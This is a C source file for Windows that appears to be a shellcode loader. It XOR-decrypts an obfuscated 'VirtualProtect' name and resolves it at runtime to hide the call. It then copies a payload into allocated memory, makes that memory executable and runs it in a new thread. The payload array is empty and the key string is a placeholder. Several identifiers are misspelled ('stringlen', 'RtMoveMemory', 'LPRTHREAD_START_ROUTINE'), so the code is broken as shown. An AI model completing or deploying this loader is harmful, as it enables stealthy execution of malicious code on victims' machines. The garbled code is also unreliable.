#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


unsigned char payload[] = {  };
unsigned int payload_len = sizeof(payload);

BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main(void) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    char key[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    char sVirtualProtect[] = " pasted contents of xorencrypt2.py ";

    //allocate a buffer for payload
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    //decrypt (DeXOR) the payload
    XOR((char *) sVirtualProtect, stringlen(sVirtualProtect), key, sizeof(key));

    //copy payload to allocated buffer
    RtMoveMemory(exec_mem, payload, payload_len);

    pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualProtect);

    //make the buffer executable
    rv = pVirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    //launch payload
    if ( rv != 0 ) {
        th = CreateThread(0, 0, (LPRTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;
}
